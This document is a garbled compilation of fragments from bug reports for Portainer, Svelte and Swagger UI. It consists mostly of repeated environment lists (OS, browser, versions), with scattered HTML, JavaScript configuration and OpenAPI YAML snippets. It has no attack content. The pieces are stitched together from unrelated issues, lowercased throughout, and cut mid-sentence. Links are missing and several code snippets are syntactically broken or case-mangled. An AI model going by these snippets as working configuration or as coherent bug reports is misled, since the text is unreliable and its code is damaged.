* browser: opera 42.0.2393.94 when i do `view source` i get the following source code and a blank screen
``` <!doctype html>
<html lang="en" ng-app="portainer">
<head> <meta charset="utf-8"> <title>portainer</title> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <meta name="description" content=""> <meta name="author" content="portainer.io"> <link href="css/vendor.css" rel="stylesheet"> <link href="css/portainer.css" rel="stylesheet"> <link rel="shortcut icon" href="ico/favicon.ico"> <link rel="apple-touch-icon-precomposed" href="ico/apple-touch-icon-precomposed.png">
</head> <body ng-controller="maincontroller"> <div id="page-wrapper" ng-class="{open: toggle && $state.current.name !== \'auth\' && $state.current.name !== \'endpointinit\', nopadding: $state.current.name === \'auth\' || $state.current.name === \'endpointinit\'}" ng-cloak> <div id="sideview" ui-view="sidebar"></div> <div id="content-wrapper"> <div class="page-content">
* portainer version: 1.10.2
* portainer version: 0a38bba87449e864f91eeb2e8d9de3c399a721ec
* target docker version (the host/cluster you manage): 1.12.3
* target swarm version (if applicable): n/a
* platform (windows/linux): mac os
* browser: chrome, safari
* portainer version: portainer v1.10.2
* target docker version (the host/cluster you manage): docker version 1.12.4, build 1564f02
* target swarm version (if applicable): docker api version 1.24
* platform (windows/linux): ubuntu 16.04
* browser: chrome / safari ![bildschirmfoto 2016-12-19 um 11 30 52](
this bug appears when using portainer with docker 1.9
works fine with docker 1.12
it looks like the id is of the network is not injected in the link causing portainer to redirect to #/networks// and failing to load the id
* portainer version: 1.10.2
* target docker version (the host/cluster you manage): 1.9.1
* platform (windows/linux): linux
* portainer version: v1.10.2
* target docker version (the host/cluster you manage): 1.12.3, build 6b644ec
* target swarm version (if applicable): swarm kit with docker engine
* platform (windows/linux): centos linux release 7.2.1511 (core)
* browser: chrome 54.0.2840.99 m
* portainer version: v1.10.1
* target docker version (the host/cluster you manage): 1.12.3
* platform (windows/linux): linux
* browser: chrome
* portainer version: 0.10.1
* platform (windows/linux): linux
* browser: all
* portainer version: 1.10.1
* target docker version (the host/cluster you manage): 1.12.3
* browser: all
* portainer version: 8a4d981e53275abcda8ca57de25e92a28304cda3ffe58f5ce4bc429e72be386a
* target docker version (the host/cluster you manage): 1.12.3
* target swarm version (if applicable):
* platform (windows/linux): linux
* browser: chrome (on osx)
* portainer version: 1.9.3
* target docker version (the host/cluster you manage): 1.12.2
* platform (windows/linux): linux
* portainer version: 1.9.3
* platform (windows/linux): linux
* browser: firefox
* portainer version: container have latest tag on docker hub
* target docker version (the host/cluster you manage): ```
client: version: 1.11.2 api version: 1.23 go version: go1.5.4 git commit: b9f10c9 built: wed jun 1 21:47:50 2016 os/arch: linux/amd64 server: version: swarm/1.2.3 api version: 1.22 go version: go1.5.4 git commit: eaa53c7 built: fri may 27 17:25:03 utc 2016 os/arch: linux/amd64
* target swarm version (if applicable):
docker swarm 1.12 with consul discovery service - server version: swarm/1.2.3
* platform (windows/linux): ubuntu 14.04x64
* browser: google chrome: 53.0.2785.101 (official build) (64-bit)
* portainer version: container have latest tag on docker hub
* target docker version (the host/cluster you manage): ```
client: version: 1.11.2 api version: 1.23 go version: go1.5.4 git commit: b9f10c9 built: wed jun 1 21:47:50 2016 os/arch: linux/amd64 server: version: swarm/1.2.3 api version: 1.22 go version: go1.5.4 git commit: eaa53c7 built: fri may 27 17:25:03 utc 2016 os/arch: linux/amd64
* target swarm version (if applicable):
docker swarm 1.12 with consul discovery service - server version: swarm/1.2.3
* platform (windows/linux): ubuntu 14.04x64
* browser: google chrome: 53.0.2785.101 (official build) (64-bit)
* portainer version: 1.9.3
* target docker version (the host/cluster you manage): 1.12.3
* platform (windows/linux): elementary os (loki, ubuntu 16.04)
* browser: chromium 54
- portainer version: 1.9.3
- target docker version (the host/cluster you manage): 1.12.2-cs2-ws-beta
- platform (windows/linux): windows server 2016
- portainer version: 1.9.3
- target swarm version (if applicable): 1.2.5
- portainer version: 1.9.1
- portainer version: 1.9.1
locally, svelte 3.29.0 with rollup 2.26.11 and babel 7.11.6 with `preset-env: { esmodules: true }` also reproduces in the repl with the above link.
- your browser and the version: (e.x
chrome 52.1, firefox 48.0, ie 10)
chrome, firefox - your operating system: (e.x
os x 10, ubuntu linux 19.10, windows xp, etc)
arch linux - svelte version 3.29.0 n/a
- browser: firefox 80.0.1 - os: macos catalina 10.15.6 - svelte version: 3.25.1 - bundler: rollup (i believe? it's still only in repl)
- all browsers - latest macos - 3.24.1 - rollup
firefox 79b, arch linux, svelte 3.24.0, rollup
repl with latest svelte
- firefox latest, but it's in the generated code so happens everywhere
- windows 10
- `svelte@3.23.2`
- rollup, can see in repl
- your browser and the version: chrome 83.0.4103.97 - your operating system: os x 10.15.5 - svelte version: 3.23.2 - using rollup
- chrome - linux mint - svelte version 3.23.2 - rollup
- chrome 81 & safari 13.1.1
- macos 10.15.5
- svelte 3.23.2
- your browser and the version: google chrome version 83.0.4103.61 (official build) (64-bit) - svelte version 3.23 repl, none
- your browser and the version: chromium 81.0.4044.129
- your operating system: arch linux
- svelte version 3.20.1 - 3.22.2
- webpack, storyboard, @babel/preset-env (but note that since this happens in the repl i don't think any of this is related)
- all browsers
- windows 10
- rollup, but it shows in the repl
- in chrome 81, it shows `cannot read property '$$' of undefined`
- in firefox 75, it shows `component is undefined`
- svelte version: 3.21.0
- svelte version 3.21.0
svelte-3.21.0 & rollup.
- your browser and the version: chrome 81 (correct), safari (broken) - your operating system: windows 10 (correct), ipados 13.4.1 (broken) - svelte version : 3.20.1 : rollup
this concerns the repl live on svelte.dev.
- your browser and the version: (e.x
chrome 52.1, firefox 48.0, ie 10) - windows & osx, repl, rollup, chrome 80, svelte v3.2
svelte 3.20.1 (see repl)
- svelte 3.20.0
- firefox nightly - windows 10 - svelte version 3.19.2 - rollup
- firefox 74
- windows 10
- svelte 3.19.2
- browser independent
- reproducible in repl
- your browser and the version: firefox 72, chrome 80, safari 13 - your operating system: os x 10.14.6 - svelte version: 3.18.1 - rollup
- your browser and the version: firefox 73.0b9 (64-bit) - your operating system: os x 10.14 - svelte version 3.18.1
independent of browser.
svelte 3.17.0+
- svelte 3.17.2
- chrome 77
- windows 7
- svelte 3.17.1
- chrome 77
- svelte 3.17.1
- windows 7
- your browser and the version: (e.x
chrome 52.1, firefox 48.0, ie 10)
ff, chrome - your operating system: (e.x
os x 10, ubuntu linux 19.10, windows xp, etc)
mac - svelte version 3.17.0 both reproduce bug
- svelte 3.17.0
- your browser and the version: (e.x
chrome 52.1, firefox 48.0, ie 10)
n/a - your operating system: (e.x
os x 10, ubuntu linux 19.10, windows xp, etc)
arch linux - svelte version 3.16.7 rollup
svelte 3.16.7 - independent of browser or bundler.
firefox 71 and chrome 81
in repl with v3.16.7.
- chrome version 79.0.3945.88 (official build) (64-bit) - your operating system: win10 - svelte version: 3.16.7
- your browser and the version: firefox 71
- your operating system: windows 10
- svelte version : 3.16.7 : rollup
- firefox 71.0, chrome 77.0.3865.90 and safari 13.0.4 (15608.4.9.1.3)
- macos 10.15.2 (19c57)
- svelte version 3.16.5
* all browsers.
* svelte v3.16.5
svelte 3.16.0, 3.16.1
- this only happens on chrome/brave browser
on firefox the elements correctly declare themselves visible
- happens on windows and mac - svelte version 3.16
not relevant but i'm using svelte v3.16.0
- firefox 70.0.1 - manjaro gnu/linux - 3.16.0
3.15.0, but present since 3.13.0.
svelte 3.14.1, webpack, mac os mojave
problem replicated in repl with svelte 3.13.0.
this issue affects version 3.13.0 and up.
- your browser and the version: (ie 11) - your operating system: (windows 7) - svelte version (3.12..1) - whether your project uses webpack or **rollup**
- your browser and the version: safari 13, chrome 78, firefox 70 - your operating system: macos 10.15.1 - svelte version 3.13.0 : rollup
chrome, safari, firefox - your operating system: (e.x
os x 10, ubuntu linux 19.10, windows xp, etc)
macos 10.15 - svelte version v3.13.0 rollup
- chrome 78
- svelte 3.12.1
- rollup used
- svelte version 3.12.1
- your browser and the version: version 77.0.3865.120 (official build) (64-bit) - your operating system: os x 10 - svelte version 3.12.1
- your browser and the version: chromium: 77.0.3865.120 - your operating system: os x 10.15
- svelte version: 3.12.1
- svelte 3.13.0-alpha.0
- svelte version 3.13.0-alpha.0
- your browser and the version: chrome 77.0
- your operating system: windows 10
- svelte version: 3.12.1
svelte 3.12.1
- svelte version 3.9.1 compared to every single version above
- svelte version 3.12.1
- your browser and the version: firefox 69 - your operating system: ubuntu linux 18.04 - svelte version 3.12.1
- svelte 3.12.1
firefox 69.0
svelte 3.12.0
- chrome 76 - os windows 10 - svelte version 3.9.2 - rollup
- your browser and the version: firefox - your operating system: macos - svelte version: i don't know? whatever the repl is running? : rollup
- svelte: 3.8.0
- typescript: 3.5.3
- node: 12.4.0
- svelte version: 3.7.1
- operating system: macos 10.13.4
- browser: irrelevant
- webpack or rollup: rollup, but irrelevant
- svelte 3.7.1
- your browser and the version: (e.x
chrome 52.1, firefox 48.0, ie 10)
nw.js version 40
- your operating system: (e.x
os x 10, ubuntu linux 19.10, windows xp, etc)
macos mogave
- svelte version 3.6.8 rollup 1.17
- firefox 68.0.1 (64-bit)
- linux mint 19.1 tessa x86_64, kernel 4.15.0-55-generic
- svelte version 3.0.0
- using webpack
chrome version 75.0.3770.142 (official build) (64-bit) macos 10.13.3 svelte v3.6.4-v3.6.7 (most recent atm) svelte repl
macos] windows 10 pro
browser: [e.g
chrome, safari] chrome
version: [e.g
22] version 85.0.4183.102 (official build) (64-bit)
method of installation: [e.g
npm, dist assets] raw code
swagger-ui version: [e.g
3.10.0] master
swagger/openapi version: [e.g
swagger 2.0, openapi 3.0] 3.0.1
- os: windows - browser: chrome - version: 85 - method of installation: - swagger-ui version: 3.14.1 - swagger/openapi version:
- os: windows 10 - browser: chrome - version: 84.0.4147.125 - method of installation: npm - swagger-ui version: 4.1.4 - swagger/openapi version: openapi 3
- os: windows - browser: chrome - version: 84 - method of installation: local build - swagger-ui version: 3.32.1 - swagger/openapi version: swagger 2.0
- os: windows 2019 - browser: chrome - version: 84.0.4147.125 - method of installation: dist assets - swagger-ui version: 3.31.1 - swagger/openapi version: 2.0
- os: macos - browser: chrome - version: 84 - method of installation: online - swagger-ui version: not sure - swagger/openapi version: openapi 3.0
- os: macos - browser: chrome
- os: macos - browser: chrome - method of installation: dist - swagger-ui version: 3.29.0 - swagger/openapi version: openapi 3.0
- os: macos - browser: chrome - version: 84.0.4147.89 - method of installation: swaggeruibundle from unpkg - swagger-ui version: 3.30.1 - swagger/openapi version: openapi 3.0.2
- os: windows 10 - browser: chrome latest - method of installation: dist assets - swagger-ui version: 3.26.0 and later - swagger/openapi version: openapi 3.0
- os: windows 10 - browser: chrome latest - method of installation: - swagger-ui version: 3.25.5 - 3.28.0
didn't check earlier versions
- swagger/openapi version: openapi 3.0
- os: windows 10 - browser: chrome, firefox - method of installation: - swagger-ui version: 3.25.4, 3.28.0 - swagger/openapi version: 2.0, 3.0
- os: [macos] - browser: [chrome] - version: [version 83.0.4103.116] - method of installation: [e.g
npm] - swagger-ui version: [e.g
3.27.0 swagger-ui-react] - swagger/openapi version: [e.g
swagger 2.1,3, openapi 3.0.1]
- os: macos - browser: chrome - method of installation: dist - swagger-ui version: 3.26.2 - swagger/openapi version: openapi 3.0
- os: [mint] - browser: [chrome] - version: [80] - method of installation: [e.g
npm, dist assets] - swagger-ui version: [3.25.1] - swagger/openapi version: [springdoc-openapi: 1.3.9]
- os: windows 10 - browser: chrome - version: 81 - method of installation: nuget (swashbuckle.aspnetcore.swagger) - swagger-ui version: 3.25.0 - swagger/openapi version: openapi 3.0
- os: macos - browser: chrome - version: 81 - method of installation: editor.swagger.com - swagger-ui version: i think editor.swagger.com is using the latest i.e
3.25.4 - swagger/openapi version: swagger 2.0
- os: archlinux - browser: firefox - version: 76 - method of installation: docker - swagger-ui version: 3.25.3 - swagger/openapi version: openapi 3.0
- os: windows - browser: chrome - version: 80.0.3987.149 - method of installation: both swagger-ui - swagger-ui version: 3.25.1 - swagger/openapi version: v2 (
- os: ubuntu - browser: chrome - version: 81 - method of installation: - swagger-editor version: 3.8.0 - swagger/openapi version: openapi 3.0.2
- os: windows 10 - browser: google chrome - version: 80 - method of installation: cdn (unpkg.com) - swagger-ui version: 3.25.0 - swagger/openapi version: openapi 3.0
- os: [macos] - browser: [chrome] - version: [3.25.0] - method of installation: [dist assets] - swagger-ui version: [3.25.0] - swagger/openapi version: []
- os: windows - browser: chrome - version: latest - method of installation: dist - swagger-ui version: 3.18.3 - swagger/openapi version: openapi 3.0
- os: windows 10 - browser: chrome - version: 79.0.3945.130 (official build) (64-bit) - method of installation: ` ` - swagger-ui version: 3.25.0 - swagger/openapi version: openapi 3
macos] linux - browser: [e.g
chrome, safari] chrome - version: [e.g
22] 79.0.3945.88 - method of installation: [e.g
npm, dist assets] included from ` ` - swagger-ui version: [e.g
3.10.0]: `swagger-ui-dist@3` as provided by jsdelivr - swagger/openapi version: [e.g
swagger 2.0, openapi 3.0]: 3.0.2
- os: ubuntu 18 - browser: chrome - version: 80.0.3987.87 (official build) (64-bit) - method of installation: npm - swagger-ui version: 3.25.0 - swagger/openapi version: [e.g
swagger 2.0, openapi 3.0]
- os: macos - browser: chrome - version: 79 - method of installation: docker hub latest - swagger-ui version: 3.24.3 - swagger/openapi version: openapi 3.0
- os: macos - browser: chrome - version: 3.24.0 using - method of installation: - swagger-ui version: 3.24.0 - swagger/openapi version: openapi 3.0
- os: linux (ubuntu 18.04) - browser: google chrome - version: 78.0.3904.50 - method of installation: webjars clasic - swagger-ui version: 3.23.8 - swagger/openapi version: openapi 3.0
- swagger-ui version: 3.23.11 - swagger/openapi version: openapi 3.0
- os: windows 10 - browser: chrome latest - method of installation: - swagger-ui version: 3.23.11 - swagger/openapi version: openapi 3.0
- os: docker on windows 10 with linux containers - browser: chrome - version: 76 - method of installation: docker - swagger-ui version: v3.23.4 - swagger/openapi version: swagger 2.0
- os: macos - browser: chrome - version: 75.0.3770.100 - method of installation: direct js files - swagger-ui version: newest, i believe - swagger/openapi version: openapi 3
- os: macos - browser: chrome, safari, firefox - method of installation: dist bundle, swagger.io demo - swagger-ui version: 3.18.3 - swagger/openapi version: swagger 2.0
- os: windows 10 - browser: any - method of installation: - swagger-ui version: 3.23.0 - swagger/openapi version: openapi 3.0
- os: windows 10 - browser: chrome latest - method of installation: - swagger-ui version: 3.21.0 - swagger/openapi version: openapi 3.0
- os: centos 7 - browser: vivaldi - version: 2.3.1440.60 - method of installation: git clone, using dist directory - swagger-ui version: 604c7b420f069b132a3d8b4636afe91a4f473fe2 - swagger/openapi version: swagger 2.0
- os: windows - browser: chrome - version: 72 - method of installation: visual studio code extension (openapi-designer) - swagger-ui version: [e.g
3.21.0] - swagger/openapi version: openapi 3.0
- os: macos - browser: chrome - method of installation: `pip install swagger-ui-bundle` - swagger-ui version: 3.20.5 - swagger/openapi version: openapi 3.0
- os: ubuntu 16.04 - browser: chrome / firefox - version: 72.0.3626.71 / quantum (up-to-date) - method of installation: dist assets - swagger-ui version: tested 3.18.2 and 3.20.9
- os: macos - browser: opera (chrome) - version: 58 - method of installation: editor.swagger.io - swagger-ui version: editor.swagger.io - swagger/openapi version: openapi 3.0.0
- os: macos - browser: chrome, safari - version: chrome 71.0, safari 11.1.2 - method of installation: dist assets - swagger-ui version: 3.18.3 - swagger/openapi version: openapi 3.0
- os: windows 10 - browser: chrome 71.0.3578.98 - method of installation: npm - swagger-ui version: 3.20.7 - swagger/openapi version: either
- os: windows 10.0.17763.253 x64 - browser: firefox - version: 64.0.2 - method of installation: `npm run dev` - swagger-ui version: abf34961e92efdf041445a353612a0ddb2d84aed - swagger/openapi version: any
- os: windows - browser: chrome - version: 70 - method of installation: zip download - swagger-ui version: 3.19.5 - swagger/openapi version: swagger 2.0
- os: ubuntu 18.04 - browser: firefox - swagger/swagger-ui: latest (
- os: windows - browser: chrome - version: 69 - method of installation: swagger-ui-dist - swagger-ui version: 3.19.3 - swagger/openapi version: swagger 2.0
- browser: chrome
- version: most recent
- method of installation: docker image
- swagger-ui version: 3.19.3
- swagger/openapi version: openapi 3.0
- os: windows 10 - browser: chrome - version: 68.0.3440.106 - method of installation: swashbuckle - swagger-ui version: - swagger/openapi version: swagger 2.0
- os: windows 10 64bit - browser: chrome - version: 69.0.3497.100 (official build) (64-bit) - method of installation: dist - swagger-ui version: 3.19.0 - swagger/openapi version: openapi 3.0.1
- os: linux - browser: firefox - version: 62 - method of installation: local - swagger-ui version: `master` - swagger/openapi version: openapi 3.0
- os: macos - browser: chrome, safari - version: 68.0.3440.106 - method of installation: maven - swagger-ui version: 3.18.2 - swagger/openapi version: swagger 2.0.4, openapi 3.0
- os: macos 10.14 - browser: firefox, chrome - version: 57, 68 - method of installation: npm - swagger-ui version: 3.18.3 - swagger/openapi version: openapi 3.0.1
- os: windows 8 - browser: firefox developer edition - version: 62 - method of installation: npm - swagger-ui version: 3.18.1 - swagger/openapi version: openapi 3.0
- os: macos - browser: chrome - version: 68.0.3440.106 - method of installation: docker - swagger-editor version: latest - swagger/openapi version: openapi 3.0
- method of installation: npm - swagger-ui version: 3.18.x
- os: [w10] - browser: [chrome] - version: [68.0.3440.106 ] - method of installation: [maven] - springfox swagger-ui 2.9.2 uses **swagger-ui version: 3.17.1** in this version deeplinking doesn't work as expected.
it scrolls you to controllers which is alright, but it **doesn't scroll you to operation**
this will scroll and open the controller.
#/email-controller
but this will just load main page and that is all.
#/email-controller/getfullemaillistusingget i need it to work for operations also so i am using version 2.8.0 of springfox swagger-ui and there it works also for operations.
springfox swagger-ui 2.8.0 uses **3.9.1 version of swagger-ui** where it works correctly.
macos] - browser: [e.g
chrome, safari] - version: [e.g
22] - method of installation: [e.g
npm, dist assets] - swagger-ui version: [e.g
3.10.0] - swagger/openapi version: [e.g
swagger 2.0, openapi 3.0]
- os: win10 - browser: chrome - version: 67 - method of installation: git clone - swagger-ui version: 3.17.6 - swagger/openapi version: swagger 2.0 my config
window.onload = function() { // build a system const ui = swaggeruibundle({ url: "***", dom_id: \'#swagger-ui\', deeplinking: true, presets: [ swaggeruibundle.presets.apis, swaggeruistandalonepreset, ], plugins: [ swaggeruibundle.plugins.downloadurl ], layout: "baselayout" }) window.ui = ui } regards
- os: fedora - browser: firefox - version: 60.0.2 - method of installation: docker - swagger-ui version: 3.17.4 - swagger/openapi version: openapi 3.0
- os: windows 10 - browser: chrome - version: 67.0.3396.99 - method of installation: dist assets - swagger-ui version: 3.17.6 - swagger/openapi version: openapi 3.0
- os: windows 10 - browser: firefox - version: 61 - method of installation: dist assets - swagger-ui version: 3.17.5 - swagger/openapi version: openapi 3.0.1
- os: windows 7 - browser: chrome latest - method of installation: - swagger-ui version: 3.17.5 - swagger/openapi version: 2.0 this issue was originally reported on stack overflow: a similar issue for oas 3.0 was reported in #4564 and fixed in
- os: windows - browser: chrome - version: 67.0 - method of installation: dist assets - swagger-ui version: 3.17.x (potentially lower versions are affected as well) - swagger/openapi version: openapi 3.0
- os: windows 10 - browser: internet explorer 11 - version: 11.165.17134.0 - method of installation: n/a - swagger-ui version: that which is used for the pet store demo site - swagger/openapi version: that which is used for the pet store demo site
- os: on request - browser: chrome, firefox - version: on request - swagger-ui version: - swagger/openapi version:
- os: macos - browser: chrome - version: 67 - method of installation: docker hub - swagger-editor version: 3.6.3 - swagger/openapi version: 3.0.1
- os: macos - browser: chrome - version: 67 - method of installation: npm - swagger-ui version: 3.17.4 - swagger/openapi version: swagger 2.0
- os: macos - browser: chrome, safari, firefox, ..
- version: latest - method of installation: npm - swagger-ui version: 3.17.3 - swagger/openapi version: swagger 2.0
- os: [win10] - browser: [chrome] - version: [67] - method of installation: [dist] - swagger-ui version: [3.17.0] - swagger/openapi version: [ openapi 3.0]
- os: macos - browser: chrome - version: 63 - method of installation: docker - swagger-ui version: latest from docker hub: 2376859c51c8 - swagger/openapi version: swagger 2.0
- os: macos - browser: chrome - version: 67 - method of installation: none - swagger-ui version: current online version - swagger/openapi version: both swagger 2.0 and openapi 3.0
- os: osx sierra - browser: chrome - version: 67.0.3396.87 (official build) (64-bit) - method of installation: dist - swagger-ui version: 3.17.1 gitrevision":"ga6656ced" - swagger/openapi version: swagger 2.0
- os: macos high sierra 10.13.3 - browser: google chrome 66.0.3359.181 (official build) (64-bit) - method of installation: [confluence plugin]( - swagger-ui version: 3.17.1 - swagger/openapi version: swagger 2.0 (built with [swagger-maven-plugin](
### bug description
![screen shot 2018-06-18 at 12 07 21]( i am seeing this picture
when i click on it, i go to the following url:
` ` and i see this message:
{ "schemavalidationmessages": [ { "level": "error", "message": "can\'t read from file " } ]
``` however, as noted before (and as seen in the url that clicking the picture directed me to) the url to my swagger spec is:
` ` note the `&ref=master` at the end, which is not included in the `schemavalidationmessages.message`
indeed, without that `ref` query parameter, the url is not correct, so it's expected that the validator cannot read the file
however, the url used should take into account all query parameters in the url.
- os: linux - browser: chrome - version: 67 - method of installation: npm - swagger-ui version: 3.17.0 - swagger/openapi version: swagger 2.0
- os: windows 10 - browser: firefox, chrome, edge - method of installation: npm - swagger-ui version: 3.11.0 - swagger/openapi version: swagger 2.0
- os: macos - browser: chrome - version: 66.0.3359.181 - method of installation: homebrew - swagger-ui version: and swagger-editor-dist@^3.3.1 using swagger-ui@^3.12.0 - swagger/openapi version: openapi 3.0.1
- os: windows - browser: chrome - version: 67 - method of installation: dist - swagger-ui version: 3.17.0 - swagger/openapi version: openapi 3.0
- os: windows 8.1 - browser: opera, chrome, firefox - version: 53.0.2907.68 - method of installation: in demo at [
- os: ubuntu 16.04 - browser: chrome - version: 66.0.3359.170 (official build) (64-bit) - swagger/openapi version: openapi 3.0.1
- os: macos - browser: safari - version: 11.1 - method of installation: npm - swagger-ui version: 3.16.0 - swagger/openapi version: swagger 2.0
- os: any - browser: any - method of installation: npm - swagger-ui version: 3.15.0 - swagger/openapi version: openapi 3.0
- method of installation: docker - swagger-editor version: 3.5.5 - swagger/openapi version: openapi 3.0
- os: macos - browser: chrome - version: 65 - method of installation: npm - swagger-ui version: 3.14.2 - swagger/openapi version: openapi 3.0
- os: windows 10 (18.03) - browser: chrome (66.0.3359.139), edge (42.17134.1.0), firefox (60.1) - method of installation: [swashbuckle.aspnetcore]( - swagger-ui version: 3.12.2 - swagger/openapi version: swagger 2.0
- os: window - browser: chrome - method of installation: dist assets - swagger-ui version: [e.g
3.10.0] - swagger/openapi version: swagger 2.0
example swagger/openapi definition:
openapi: 3.0.1
info: title: example swagger version: '1.0'
servers: - url: /api/v1
paths: /xmltest: get: summary: subscribes to a siri vm stream operationid: registersubscription parameters: [] responses: \'200\': description: simple example content: application/xml: schema: type: object xml: name: root properties: x: type: string example: x: what the f examples: x2: summary: "xml not rendered via \'examples\' keyword" value: x: should be xml
i noticed this in our project because after adding `swagger-ui-react` we have all languages of highlight.js cluttering our bundles
i see that in the code you are already defining the languages to use for highlight.js but that has no effect as long as there is no esm version in the package
there is already a `es bundle` in the package, i noticed though that i think it is the wrong one, it should be the `es-core` bundle and not the full bundle with all dependencies bundled
after fixing that i noticed that nothing is actually pointing to the es bundle, so i fixed the esm entrypoint, but then noticed that the es-bundle is just a commonjs bundle not an esm bundle, so no matter what i try and fix here, tree shaking in our webpack won't work
webpack 4 does not support esm as output type, so i thought i might try to not bundle the code for the react package at all (not sure why webpack is used anyway in this case for the react package, just transpilling the files and putting them in the package should be fine)
but when just using babel it does not work because of the absolute imports in the source
i then tried using `babel-plugin-module-resolver`, but it does not understand the dist directories and always links to `src/` you can see here what i tried: so it would be nice to have proper `esm` in the package (with import/export) so that the bundle size is reduced when using the `swagger-ui-react` package in a project that uses webpack to bundle it
### is your feature request related to a problem?
kind of, bundle size ### describe the solution you'd like well that is why i created the ticket because i'm not sure what to do
i personally would just remove the absolute imports and use relative ones because i like that better anyway, but i assume you like absolute imports better
with relative imports it would be easy to just run babel to output the transpilled files to the package
(as can be seen in my commit above.) other possibility might be to migrate from webpack to rollup for this case, as it supports es modules bundles
~i really tried a lot to make `babel-plugin-module-resolver` work, but i can't figure out if that is ever supposed to work.~ i have no other ideas right now.
happens with any configuration
i'll skip the content&configuration since the issue can be reproduced with the 'pet store' demo.
example swagger/openapi definition:
- [gist](
- [view in editor](
swagger/openapi definition:
swagger-ui configuration options:
swaggerui({ filter: true
?filter=true
example swagger/openapi definition: [example.yml]( swagger-ui configuration options:
swaggeruibundle({ url: "openapi", dom_id: "#api-explorer", presets: [ swaggeruibundle.presets.apis, swaggeruibundle.swaggeruistandalonepreset ],
openapi: 3.0.0
info: title: form data with required fields version: 1.0.0
servers: - url:
paths: /post: post: requestbody: required: true # this doesn't have an impact content: application/x-www-form-urlencoded: schema: type: object required: [str, num, bool] properties: str: type: string num: type: integer bool: type: boolean responses: '200': description: ok
openapi: 3.0.0
info: title: form data test version: 1.0.0
servers: - url:
paths: /post: post: requestbody: content: application/x-www-form-urlencoded: schema: $ref: '#/components/schemas/foo' multipart/form-data: schema: $ref: '#/components/schemas/bar' responses: '200': description: ok components: schemas: foo: type: object properties: foo: type: string example: '' bar: type: object required: [bar] properties: bar: type: integer example: 1
example swagger/openapi definition:
swagger: "2.0"
info: title: response headers test version: 1.0.0
host: httpbin.org
schemes: [https]
paths: /response-headers: get: summary: run the request using the default parameter values parameters: - in: query name: x-header1 type: string x-example: 'value1,value1' required: true - in: query name: x-header2 type: string x-example: 'value1, value1' required: true - in: query name: x-header3 type: array items: type: string x-example: [value1, value2] collectionformat: multi required: true - in: query name: access-control-expose-headers type: string x-example: 'x-header1, x-header2, x-header3, access-control-expose-headers' required: true responses: 200: description: ok
using an openapi.json file which has displayed correctly in the past, the ui appears to be broken for react apps
screenshot shows petshop example api definition suffers from the same issue
minimal example
import react from 'react';
import swaggerui from 'swagger-ui-react';
import \'swagger-ui-react/swagger-ui.css\'; const app = () => <swaggerui url=" " />; export default app;
the example can be found at:
![20200618170404]( example swagger/openapi definition:
openapi: 3.0.0
info: title: "swagger test" version: "1.0.0"
servers: - url:
paths: /users: get: tags: - user summary: get users responses: 200: description: user list content: application/json: schema: type: array items: $ref: '#/components/schemas/user' post: tags: - user summary: create a user requestbody: content: application/x-www-form-urlencoded: schema: $ref: '#/components/schemas/user' responses: 201: description: created successfully
components: schemas: user: type: object properties: id: type: integer readonly: true name: type: string required: - name
@bean public openapi customopenapi() { return new openapi() .components(new components().addsecurityschemes("basicscheme", new securityscheme().type(securityscheme.type.http).scheme("basic"))) .addsecurityitem(new securityrequirement().addlist("basicscheme", collections.singletonlist("basic"))); }
``` example swagger/openapi definition:
springdoc: endpoint: "/swagger" pathstomatch: /v1/** api-docs: enabled: true path: ${springdoc.endpoint}/v3/api-docs swagger-ui: path: ${springdoc.endpoint}/swagger-ui.html cache: disabled: true
this looks like another new problem when having 'entries' as property name
other properties in the same level of \'entries\' properties, fails to load with error "could not render this component, see the console" example swagger/openapi definition:
```yaml swagger: '2.0' info: title: test me version: '1' paths: '/test/me': get: summary: test api operationid: gettestme produces: - '*/*' responses: '200': description: ok schema: $ref: '#/definitions/testmedto' '500': description: internal server error deprecated: false definitions: testmedto: type: object properties: name: type: string age: type: string entries: type: array items: $ref: '#/definitions/testmeentries' testmeentries: type: object properties: date: type: string time: type: string ```
swagger-ui configuration options:
i tried both yaml and json:
urls: - name: master api url: specs/master.yaml - name: bot api url: specs/bot.yaml
``` ```json
{ "urls": [ { "name": "master api", "url": "specs/master.yaml" }, { "name": "bot api", "url": "specs/bot.yaml" } ]
``` i looked at the swagger-config.yaml from this repository for reference.
example swagger/openapi definition:
```json "parameters": [ { "name": "multipart-form", "in": "formdata", "description": "one or more csv files to upload.", "required": true, "type": "file" } ] }
swagger-ui configuration options:
swaggerui({ url: ' domnode: this.container.nativeelement, deeplinking: true, presets: [swaggerui.presets.apis, swaggerui.swaggeruistandalonepreset]
example swagger/openapi definition:
openapi: "3.0.2"
info: version: "0.2" title: "test api"
components: schemas: user: allof: - $ref: \'#/components/schemas/basicmixinmodel\' - $ref: \'#/components/schemas/userfullobject\' type: object userfullobject: allof: - $ref: \'#/components/schemas/userbaseobject\' type: object required: - id properties: id: type: string userbaseobject: type: object properties: full_user_name: type: string email: type: string team_name: type: string basicmixinmodel: type: object properties: updated_by: type: string updated_at: type: string format: date-time userlist: type: object properties: query: type: string items: type: array items: $ref: "#/components/schemas/user"
paths: /users: get: description: "get all users
default sorted by id" responses: 200: description: "successful operation" content: application/json: schema: $ref: "#/components/schemas/userlist"
``` swagger-editor configuration options:
example swagger/openapi definition:
```yaml securityschemes: basicauth: type: http description: 'lalala.' scheme: basic
swagger-ui configuration options:
swaggeruibundle({ url: "/api.do", dom_id: \'#swagger-ui\', deeplinking: true, presets: [ swaggeruibundle.presets.apis, swaggeruistandalonepreset ], plugins: [ swaggeruibundle.plugins.downloadurl ], layout: "standalonelayout"
example swagger/openapi definition:
openapi: 3.0.0
info: version: 0.0.1 title: "swagger petstore"
- name: "pet/list" description: "everything about your pets"
paths: /pet: get: tags: - "pet/list" summary: "returns all pets" responses: "200": description: ok ``` swagger-ui configuration options:
const ui = swaggeruibundle({ url: "/docs/rest-api-swagger.yaml", dom_id: \'#swagger-ui\', deeplinking: true, docexpansion: "none", validatorurl: null, presets: [ swaggeruibundle.presets.apis, swaggeruistandalonepreset ] layout: "standalonelayout" )
``` ``` ```
minimal example -
swaggerui init - #l41
openapi yaml -
example swagger/openapi definition:
openapi: 3.0.2
info: title: fastapi version: 0.1.0
paths: '/{param}': get: summary: test operationid: test__param__get parameters: - required: true schema: title: param anyof: - type: integer - type: string name: param in: path responses: '200': description: successful response content: application/json: schema: {} '422': description: validation error content: application/json: schema: $ref: '#/components/schemas/httpvalidationerror'
